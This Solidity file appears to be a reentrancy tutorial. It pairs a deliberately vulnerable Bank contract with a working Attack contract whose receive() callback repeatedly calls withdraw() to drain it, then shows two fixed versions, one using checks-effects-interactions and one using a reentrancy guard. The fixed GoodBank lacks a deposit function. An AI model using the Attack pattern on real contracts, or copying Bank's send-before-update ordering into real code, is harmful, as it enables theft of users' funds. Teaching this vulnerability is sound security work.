// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Bank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0 , "Insufficient balance");
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success , "Failed to send Ether");
        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attck() external payable {
        require(msg.value == 1 ether , "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ProtectedBank {
    mapping (address => uint256) public balanceOf;
    uint256 private _status;

    modifier nonReentrant() {
        require(_status == 0, "ReentrancyGuard: reentrant call");
        _status = 1;
        _;
        _status = 0;
    }

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}